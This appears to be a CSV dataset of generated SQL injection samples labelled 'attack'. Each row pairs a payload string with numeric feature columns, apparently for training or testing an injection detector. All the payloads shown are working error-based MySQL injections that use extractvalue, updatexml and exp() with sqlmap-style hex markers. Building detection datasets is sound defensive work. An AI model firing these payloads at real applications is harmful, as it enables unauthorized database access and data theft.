id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ytlf",nearest_attack_euclidean,R000057,5.4991506442315785,157.66494750976562,62.78995895385742,23.599306106567383,61.639122009277344,7.850645542144775,83.96394348144531,31.473424911499023,1.2170789241790771,0.30216455459594727,0.21023663878440857,0.35364916920661926,0.1458691507577896,3.801755428314209,2.6066246032714844,0.9701654314994812,0.1677572876214981,0.33265236020088196,-0.010490375570952892,0.6951800584793091,6.782497882843018,2.428640604019165,5.076075553894043,-0.8147938847541809,1.434305191040039,0.1810118705034256,-0.6960136294364929,-0.08351185917854309,-0.1388600617647171,1.0106905698776245,-0.707137942314148,-0.7718101143836975,2.6530797481536865,-0.4619157016277313,-0.03544650226831436,2.173737049102783,6.41039514541626,0.7567653656005859,1.6593843698501587,0.582695722579956,0.11444053053855896,0.9412615895271301,0.3376326858997345,0.09435020387172699,0.4997875690460205,-0.0989435687661171,0.40341717004776,0.296852171421051,0.0006476638372987509,-0.013131916522979736,0.25049158930778503,0.21518786251544952,0.0030379295349121094,0.20459052920341492,0.40385547280311584,0.14263665676116943,0.09479384124279022,0.0790422111749649,-0.27241188287734985,0.8127012848854065,-0.43869146704673767,-0.5267184972763062,0.09557850658893585,0.2732105255126953,0.016590666025877,0.07267537713050842,0.845944344997406,0.33597007393836975,-0.10320507735013962,0.18023942410945892,-0.5552968978881836,0.5753868818283081,0.035841185599565506,0.07346023619174957,-0.005540753249078989,-0.029278025031089783,0.7489310503005981,0.4080832600593567,-0.31707027554512024,0.07012748718261719,0.3138042688369751,8.264402389526367,0.3190370500087738,0.22203561663627625,0.1860848367214203,1.0775840282440186,-0.06422251462936401,0.6700046062469482,-0.1477670967578888
GAN_000012,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx",nearest_attack_euclidean,R000746,4.864199061702873,176.78814697265625,64.60586547851562,29.29701805114746,82.0762710571289,8.580368995666504,84.91744995117188,25.500234603881836,0.7112864255905151,0.2857912480831146,0.18229739367961884,0.3729236423969269,0.1345437616109848,3.65446138381958,1.9894129037857056,1.5842407941818237,0.28830528259277344,0.22195880115032196,0.03332691267132759,0.3961470425128937,4.917958736419678,6.66234827041626,4.806033611297607,-0.3091816306114197,1.5445982217788696,0.16470745205879211,-0.48036181926727295,0.03271244466304779,0.009227517060935497,0.8197653293609619,-0.6101162433624268,-0.17638297379016876,2.3053042888641357,-0.3409713804721832,0.029710642993450165,2.167572259902954,6.291792392730713,0.9623562097549438,1.351578712463379,0.46724724769592285,0.09812924265861511,1.2698043584823608,0.12795507907867432,0.09357769042253494,0.5208727717399597,-0.23815733194351196,0.32259878516197205,0.2898738980293274,0.23406542837619781,0.040125489234924316,0.34906086325645447,0.14769774675369263,-0.14685513079166412,0.6848398447036743,0.3911074697971344,0.17110733687877655,0.1263417899608612,0.4886789619922638,-0.3150395154953003,0.41731131076812744,-0.09260324388742447,-0.5886238813400269,0.06922249495983124,-0.2122592180967331,0.1009964793920517,-0.13049843907356262,0.8757712841033936,0.017042018473148346,0.07987115532159805,0.16282445192337036,-0.34445688128471375,0.09367779642343521,-0.34929829835891724,0.05482475459575653,-0.004430001135915518,-0.018667107447981834,1.1519824266433716,0.3986626863479614,-0.12431452423334122,0.04183410480618477,0.17870382964611053,7.464491844177246,0.2849424481391907,0.19498760998249054,0.12277606874704361,0.6595370769500732,-0.04328072443604469,0.2328496128320694,-0.017578445374965668
GAN_000013,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000798,5.790308190371795,115.34159088134766,57.699363708496094,15.112957000732422,48.81782150268555,14.374099731445312,79.6549072265625,27.960590362548828,0.8908392190933228,0.26569023728370667,0.20741312205791473,0.3382709324359894,0.13393950462341309,3.7059757709503174,2.922513008117676,2.026914119720459,0.3147256076335907,0.18875041604042053,0.041683655232191086,0.15626488626003265,3.776853561401367,2.9033262729644775,6.009089946746826,-0.533807635307312,1.271494746208191,0.12629730999469757,-0.555443525314331,-0.21632713079452515,0.10081692039966583,1.099587321281433,-0.801476001739502,-0.3255135416984558,2.684882640838623,-0.2516232430934906,0.10586769133806229,1.861043095588684,2.7742414474487305,0.05696800723671913,0.7749908566474915,0.47353801131248474,0.27830183506011963,1.311321496963501,-0.1236361414194107,0.20287783443927765,0.42346203327178955,0.10811328887939453,0.5140241384506226,0.16027340292930603,0.06930878758430481,-0.15104740858078003,0.17184412479400635,0.32095199823379517,0.09943083673715591,0.9023816585540771,0.39699721336364746,0.3095821142196655,0.040016356855630875,0.5669651627540588,-0.17225861549377441,0.2942515015602112,-0.6637637615203857,0.039784811437129974,0.39977821707725525,-0.5291762948036194,-0.07137133926153183,-0.09009863436222076,1.1508456468582153,0.09510620683431625,0.13403303921222687,0.15216180682182312,-1.0457957983016968,0.26341700553894043,-0.005738832056522369,0.014494620263576508,-0.03142743930220604,-0.033335424959659576,0.9394392371177673,0.12016402184963226,-0.019060835242271423,-0.2029113918542862,0.0617944598197937,5.409419536590576,0.14225110411643982,0.20043334364891052,0.15132039785385132,0.9252116084098816,0.23478730022907257,1.0017954111099243,-0.06280867010354996
GAN_000014,attack,error,"1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000288,4.75745356299488,177.4432830810547,68.82594299316406,28.179353713989258,71.86090850830078,9.47375202178955,81.24085235595703,33.85647964477539,0.8656226992607117,0.2867251932621002,0.1881595253944397,0.36256104707717896,0.1367194950580597,3.7966177463531494,2.073101043701172,1.0301263332366943,0.24890972673892975,0.14100150763988495,0.027930380776524544,0.29840293526649475,7.253910064697266,5.804263591766357,4.524374008178711,-0.32860293984413147,1.4944448471069336,0.12303443253040314,-0.286706805229187,0.04560874402523041,-0.009369400329887867,0.8134204745292664,-0.39398765563964844,-0.4315953254699707,2.3191587924957275,-0.2105180025100708,0.09509053081274033,1.9996243715286255,5.954490661621094,0.6473744511604309,1.5445421934127808,0.34818893671035767,0.30020201206207275,1.220523476600647,0.34253382682800293,0.07806632667779922,0.3294737637042999,-0.12951162457466125,0.24751010537147522,0.2623533606529236,0.27434101700782776,0.09916523098945618,0.3796488344669342,0.262442409992218,-0.011779852211475372,0.2771838903427124,0.3147066831588745,0.13034766912460327,0.09732020646333694,0.13750632107257843,-0.44461333751678467,0.4903620481491089,-0.2914833128452301,-0.24622564017772675,0.18592220544815063,-0.23038369417190552,0.11157463490962982,0.11958687007427216,0.815366804599762,0.07321875542402267,-0.10973198711872101,-0.0702914372086525,-0.5098402500152588,0.19539204239845276,-0.08920752257108688,-0.2447132170200348,-0.026903707534074783,-0.022120634093880653,0.8920813202857971,0.2560949921607971,-0.14421194791793823,0.06671693921089172,0.19004859030246735,7.1317572593688965,0.4325196444988251,0.16756325960159302,0.15400178730487823,0.9059228897094727,0.02132636494934559,0.3119189441204071,0.01799880713224411
GAN_000015,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000934,4.667910576472884,181.55540466308594,68.00762176513672,30.401653289794922,81.14254760742188,10.644598007202148,71.83344268798828,32.682586669921875,0.9612728357315063,0.2720860540866852,0.18027520179748535,0.3734668791294098,0.13338738679885864,3.636587381362915,2.1256937980651855,1.3080476522445679,0.7447637319564819,0.14903706312179565,0.03407294303178787,0.04334567114710808,5.545838356018066,7.184797763824463,5.1668243408203125,-0.13361063599586487,1.492503046989441,0.1150725930929184,-0.1986566185951233,0.12664306163787842,0.10809674113988876,0.934521496295929,-0.45466700196266174,-0.19096910953521729,2.139214038848877,0.12942124903202057,0.1986907571554184,2.106950044631958,4.861143589019775,0.433122843503952,1.1764404773712158,0.29225605726242065,0.34310001134872437,1.1569653749465942,0.2125149667263031,0.08457977324724197,0.24984148144721985,0.14157333970069885,0.0943501889705658,0.2584889531135559,0.22233445942401886,0.07633823156356812,0.18361306190490723,0.3913404941558838,0.03555811941623688,0.5656784772872925,0.343698650598526,0.19731327891349792,0.14247000217437744,0.4588533937931061,-0.26300016045570374,0.1352340281009674,-0.2535707652568817,-0.06016739085316658,0.3518546223640442,-0.28753048181533813,0.05141272768378258,-0.01923513039946556,0.9472408294677734,-0.1578281819820404,0.13217617571353912,0.09515262395143509,-0.4794846475124359,-0.10701048374176025,-0.24348363280296326,-0.02731233835220337,-0.02558494359254837,-0.009504049085080624,1.2141015529632568,0.30098822712898254,-0.07250043004751205,-0.08999868482351303,0.026094898581504822,6.956664562225342,0.37257272005081177,0.18829379975795746,0.09079937636852264,0.695480227470398,-0.11478932201862335,0.44026029109954834,-0.08214215934276581
GAN_000016,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.871377022791104,189.49014282226562,74.47442626953125,28.63654136657715,77.89564514160156,5.999166488647461,74.64590454101562,30.817123413085938,0.8740813732147217,0.2683103680610657,0.17569473385810852,0.36718639731407166,0.1398763358592987,3.598133087158203,2.3298540115356445,1.88123619556427,0.7267890572547913,0.07140044122934341,0.038618143647909164,0.01873299852013588,6.452880382537842,6.916665077209473,5.290008068084717,-0.3636019825935364,1.5478366613388062,0.11174985766410828,-0.19560754299163818,-0.127864807844162,0.06668052077293396,0.9611413478851318,-0.709335446357727,-0.2880258560180664,2.204078435897827,0.07234478741884232,0.15310707688331604,2.0672826766967773,5.848740100860596,0.7159557342529297,1.4639018774032593,0.16049650311470032,0.32509976625442505,1.2219147682189941,0.02601153403520584,0.1135239452123642,0.39725133776664734,-0.020363904535770416,0.11165179312229156,0.2965765595436096,0.21614553034305573,0.12772634625434875,0.2993912100791931,0.43015462160110474,-0.2023819535970688,0.6861577033996582,0.32303470373153687,0.2029544711112976,0.14542943239212036,0.44746869802474976,-0.10734954476356506,0.5273386240005493,-0.28561434149742126,0.12223738431930542,0.13059325516223907,-0.35176920890808105,0.05302281305193901,0.023231975734233856,0.9600070714950562,-0.030573800206184387,0.20585107803344727,0.16742223501205444,-0.6681029796600342,-0.13927911221981049,-0.00577254593372345,-0.16730839014053345,-0.006493404041975737,-0.01800101064145565,0.9900377988815308,0.17710082232952118,-0.06034547835588455,-0.1261528581380844,-0.024442046880722046,6.930627346038818,0.4798394739627838,0.2008565068244934,0.06003182381391525,0.7209508419036865,0.03374233841896057,0.5145033001899719,0.3132413327693939
GAN_000017,attack,error,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000598,5.182014109740704,155.2904815673828,67.32783508300781,24.910058975219727,62.60475540161133,12.270085334777832,76.6011734008789,25.455564498901367,0.7487931251525879,0.28563934564590454,0.18342472612857819,0.3688231408596039,0.12913697957992554,3.647332191467285,2.0033514499664307,1.7190982103347778,0.37999463081359863,0.1881280392408371,0.055960774421691895,0.20457826554775238,4.770176410675049,5.001501083374023,4.7729363441467285,-0.28033262491226196,1.4110170602798462,0.15349151194095612,-0.17292563617229462,0.09878164529800415,0.08283854275941849,0.789155125617981,-0.5913858413696289,-0.030085839331150055,2.0920305252075195,-0.2992762625217438,0.025326304137706757,2.2515838146209717,4.745516777038574,0.754043698310852,1.2514671087265015,0.4183511734008789,0.2209424525499344,1.317870020866394,0.15860077738761902,0.11091234534978867,0.5154500007629395,-0.3226196765899658,0.33271366357803345,0.281859427690506,0.09758365154266357,-0.05515894293785095,0.35317280888557434,0.24623127281665802,-0.32033032178878784,1.0507159233093262,0.4557497501373291,0.19883446395397186,0.12894782423973083,0.5010850429534912,-0.4134058356285095,0.3126286268234253,-0.07434508204460144,-0.43197154998779297,0.083110511302948,-0.35464853048324585,0.1940387338399887,-0.034728847444057465,1.0789371728897095,0.10592775791883469,-0.01410773117095232,-0.022005289793014526,-0.4224044978618622,-0.05112721025943756,-0.47235435247421265,-0.05685114860534668,-0.012942984700202942,-0.020855318754911423,1.1008305549621582,0.2894933223724365,-0.04795096069574356,-0.0821111872792244,0.11468963325023651,6.240140914916992,0.20552897453308105,0.17603492736816406,0.13795197010040283,0.8328962326049805,-0.011219581589102745,0.26358768343925476,-0.16108748316764832
GAN_000018,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000584,5.012726190866194,143.85885620117188,64.1827392578125,24.04111099243164,59.34422302246094,12.086594581604004,75.97490692138672,27.292497634887695,1.3340425491333008,0.264699250459671,0.1973237544298172,0.3645610809326172,0.1351146697998047,3.654738187789917,2.5576581954956055,1.7319326400756836,0.6797133684158325,0.18052586913108826,0.06945779919624329,0.06267189979553223,3.7855114936828613,4.432521343231201,5.573126316070557,-0.42797261476516724,1.3462862968444824,0.11246038228273392,-0.24466881155967712,0.03780396282672882,0.006690944079309702,1.009198784828186,-0.6454406380653381,-0.4433295726776123,2.5694828033447266,0.07964468747377396,0.186147078871727,2.081728219985962,3.209824562072754,0.4262748658657074,1.2766987085342407,0.31968843936920166,0.22911973297595978,0.9425868988037109,-0.011352017521858215,0.13967181742191315,0.12976378202438354,0.09472894668579102,0.1162622720003128,0.24415980279445648,0.0750393271446228,-0.26065748929977417,0.1383523941040039,0.2866344749927521,-0.35549086332321167,0.7211194038391113,0.41947829723358154,0.23301683366298676,0.14401090145111084,0.4253825843334198,-0.3257441520690918,0.27144408226013184,-0.4535674452781677,-0.10856601595878601,0.2060389369726181,-0.3925507664680481,0.03292204812169075,-0.08872479200363159,1.164052963256836,-0.2628166079521179,0.07756062597036362,0.09179927408695221,-0.4499981701374054,-0.09875895082950592,-0.2572019100189209,0.06941482424736023,-0.003745980327948928,-0.02146036922931671,1.0411053895950317,0.23922990262508392,-0.19520610570907593,-0.15890170633792877,0.006557956803590059,5.783668518066406,0.18902665376663208,0.2604745030403137,0.09058182686567307,0.8860234618186951,-0.06059083342552185,0.541327953338623,-0.14965152740478516
GAN_000019,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000798,5.490139957172407,96.9793472290039,59.352474212646484,16.191774368286133,45.26103973388672,16.23309898376465,85.46826171875,20.124454498291016,0.901846706867218,0.2554115056991577,0.20740073919296265,0.353462278842926,0.12421561032533646,3.706366539001465,2.545213460922241,1.541704535484314,0.1795855313539505,0.20140382647514343,0.03485269472002983,0.08385726809501648,1.944790244102478,2.9800336360931396,4.966698169708252,-0.4749772846698761,1.122908115386963,0.14994727075099945,-0.6604164242744446,-0.029738932847976685,0.060030821710824966,0.7365835905075073,-0.6439119577407837,-0.15523962676525116,2.543627977371216,-0.3592860996723175,0.06488966196775436,1.8774595260620117,2.344000816345215,0.5030893683433533,0.7253245711326599,0.6511063575744629,0.1539667695760727,1.1637544631958008,0.05740373581647873,0.1558469831943512,0.28441426157951355,-0.3300192058086395,0.5929548740386963,0.1036122739315033,0.017192989587783813,-0.3409166932106018,0.2434004843235016,0.1228046715259552,-0.23735810816287994,0.8872050046920776,0.5230767130851746,0.27913254499435425,0.07542945444583893,0.494305282831192,-0.43617355823516846,0.2167108952999115,-0.5522629618644714,-0.2739904522895813,0.34563642740249634,-0.534909188747406,0.08116070926189423,0.10815705358982086,1.1800919771194458,0.03931770473718643,-0.0903702899813652,-0.1713642179965973,-0.6786529421806335,0.027475299313664436,-0.4387332499027252,0.052929431200027466,-0.037875790148973465,-0.03159251809120178,0.9667177200317383,0.31373757123947144,-0.1263270080089569,-0.1436012238264084,0.1540047824382782,4.72817850112915,0.09686508774757385,0.2376534342765808,0.16389083862304688,0.9550610184669495,0.18806825578212738,0.48750728368759155,-0.19878923892974854
GAN_000020,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000718,4.887631641741158,150.7809295654297,62.15680694580078,27.79847526550293,72.65065002441406,9.622488021850586,75.0353775024414,28.8962345123291,1.2085859775543213,0.26732054352760315,0.200522318482399,0.3695192337036133,0.13044443726539612,3.683734178543091,2.3106894493103027,1.0759470462799072,0.4585472643375397,0.28389087319374084,-0.028481433168053627,0.14984363317489624,5.081338882446289,5.154233455657959,5.1589674949646,-0.3676714301109314,1.3609896898269653,0.16291487216949463,-0.5228034853935242,0.09242406487464905,-0.012312320061028004,0.7633283734321594,-0.5832074880599976,-0.3123249113559723,2.4595820903778076,-0.1628606915473938,0.16288095712661743,2.143965244293213,4.787755012512207,0.573201060295105,1.3123517036437988,0.6067714095115662,0.2620123028755188,0.9635394215583801,0.2817426323890686,0.0663691833615303,0.40296971797943115,-0.08867774158716202,0.3821362257003784,0.1487380862236023,0.13677656650543213,-0.0668516755104065,0.07899895310401917,0.2202366292476654,0.07164333760738373,0.37719741463661194,0.4568459987640381,0.21009594202041626,0.192457914352417,0.34825775027275085,-0.39601171016693115,0.2785375714302063,-0.44331976771354675,-0.4742359519004822,0.254168301820755,-0.19792987406253815,0.10358761250972748,0.18329200148582458,1.1034486293792725,-0.20828628540039062,-0.12312154471874237,0.027980312705039978,-0.3466710150241852,-0.000902712345123291,-0.3602902293205261,-0.003523692488670349,-0.014681827276945114,-0.013430002145469189,1.0905895233154297,0.5598664879798889,-0.22392389178276062,0.02759765274822712,0.18015064299106598,6.966026782989502,0.2814350426197052,0.25292596220970154,0.1617777794599533,0.8004857897758484,-0.11308243125677109,0.31051555275917053,-0.25703632831573486
GAN_000021,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.3635402987511895,220.49778747558594,71.56851196289062,35.30575180053711,92.37432098388672,6.287642955780029,76.42382049560547,32.60554122924805,1.0066889524459839,0.28280290961265564,0.17422498762607574,0.387702077627182,0.1343182921409607,3.6923089027404785,1.7997711896896362,1.003956913948059,0.5734401345252991,0.12193454802036285,0.04358531907200813,0.1450388878583908,6.614092826843262,8.645633697509766,4.112289905548096,-0.15124282240867615,1.6684507131576538,0.11660246551036835,-0.23282119631767273,0.20627936720848083,0.06910689175128937,0.6972619295120239,-0.19274401664733887,-0.24207693338394165,1.9794422388076782,0.09254613518714905,0.21091462671756744,2.018378973007202,6.481422424316406,0.8244963884353638,1.4979835748672485,0.29688042402267456,0.21800105273723602,0.9385414719581604,0.1914583444595337,0.1073429211974144,0.045194633305072784,0.03916575759649277,0.05712622404098511,0.33714109659194946,0.30500930547714233,0.1532641351222992,0.4069887697696686,0.31420356035232544,-0.09451320767402649,0.1681809276342392,0.28983011841773987,0.13388985395431519,0.12311065196990967,0.24463583528995514,-0.27247458696365356,0.2031976580619812,-0.21556764841079712,-0.1614169180393219,0.23774144053459167,-0.14838266372680664,0.13067010045051575,0.010080687701702118,0.7803902626037598,-0.12614049017429352,0.045116860419511795,0.012280836701393127,-0.12164446711540222,-0.0641762986779213,-0.14965379238128662,0.07570362091064453,-0.0058890474028885365,-0.005397669970989227,1.042832612991333,0.376930296421051,-0.08105171471834183,0.052298713475465775,0.15800105035305023,7.335559844970703,0.45200803875923157,0.18780945241451263,0.0814143568277359,0.6719874739646912,-0.08705073595046997,0.04950617253780365,-0.11110863089561462
GAN_000022,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000934,4.792405432890419,172.08883666992188,67.00994873046875,28.130306243896484,65.33606719970703,8.297607421875,72.2933120727539,29.551273345947266,0.9804645776748657,0.2702730894088745,0.18454837799072266,0.3722260892391205,0.13602085411548615,3.639427900314331,2.3490922451019287,1.4080297946929932,0.5371925830841064,0.1518637239933014,0.031468190252780914,-0.03897248953580856,5.3658342361450195,6.1096978187561035,4.431326389312744,-0.4156731069087982,1.551949381828308,0.11353112757205963,-0.21018745005130768,0.09031465649604797,0.04412223771214485,0.9310035109519958,-0.48670610785484314,-0.19496917724609375,1.8768999576568604,0.09935757517814636,0.0879388079047203,2.1701886653900146,4.80486536026001,0.4975295066833496,1.1932892799377441,0.3282105326652527,0.29893168807029724,1.090543508529663,0.08724555373191833,0.08824604004621506,0.2657039761543274,0.10728048533201218,0.16520267724990845,0.25830918550491333,0.10888570547103882,0.01074102520942688,0.3059694468975067,0.458761602640152,-0.25541234016418457,0.7663708925247192,0.4204617738723755,0.21120986342430115,0.07707609236240387,0.5095034241676331,-0.322984904050827,0.32813966274261475,-0.20338454842567444,0.05084982514381409,0.23360395431518555,-0.1606530249118805,0.1018226221203804,0.06676197052001953,1.0528508424758911,-0.0584133006632328,0.060012269765138626,-0.04148883372545242,-0.45099732279777527,-0.13095322251319885,-0.02968553453683853,0.03924768418073654,-0.023549024015665054,-0.013397946953773499,1.0171520709991455,0.20613588392734528,-0.22117584943771362,-0.12200788408517838,0.07717062532901764,6.608932971954346,0.37495294213294983,0.18365982174873352,0.10202383249998093,0.7418248057365417,-0.11623898148536682,0.4756130576133728,-0.07441696524620056
GAN_000023,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000934,4.806629853663229,165.73147583007812,61.39202117919922,27.43299102783203,75.04656219482422,8.894943237304688,78.83533477783203,30.248477935791016,1.1112112998962402,0.2672249972820282,0.1967465579509735,0.36861947178840637,0.13804279267787933,3.6793320178985596,2.2387547492980957,1.0084110498428345,0.3136087954044342,0.26109859347343445,-0.039195168763399124,0.2707604169845581,4.580833435058594,5.880324363708496,4.975152969360352,-0.4675004184246063,1.528624176979065,0.13178226351737976,-0.7034466862678528,0.005201667547225952,-0.040730807930231094,0.840636134147644,-0.5415099263191223,-0.2263510525226593,2.172746419906616,-0.15484687685966492,0.09849711507558823,2.02374529838562,5.626091957092285,0.38651594519615173,1.1414012908935547,0.5984128713607788,0.1384449452161789,1.111809253692627,0.1370575875043869,0.08053574711084366,0.36543360352516174,0.07156965136528015,0.4037436246871948,0.19428321719169617,0.14760500192642212,-0.052415549755096436,0.14576378464698792,0.28899329900741577,0.13052937388420105,0.37766212224960327,0.3790394961833954,0.19239327311515808,0.10322556644678116,0.4832165539264679,-0.18983447551727295,0.23992064595222473,-0.44738826155662537,-0.34874263405799866,0.2612871527671814,-0.10914891958236694,0.021041546016931534,0.04850266873836517,0.993567168712616,0.021597974002361298,-0.01490428764373064,0.08260216563940048,-0.45616385340690613,0.17752902209758759,-0.21170324087142944,0.12586967647075653,-0.020350638777017593,-0.013014835305511951,1.0464959144592285,0.4373164474964142,-0.19838440418243408,0.006911421660333872,0.2394392341375351,7.460679531097412,0.33670690655708313,0.22533252835273743,0.12248048186302185,0.6618338227272034,-0.048828572034835815,0.5501583218574524,-0.2958691120147705
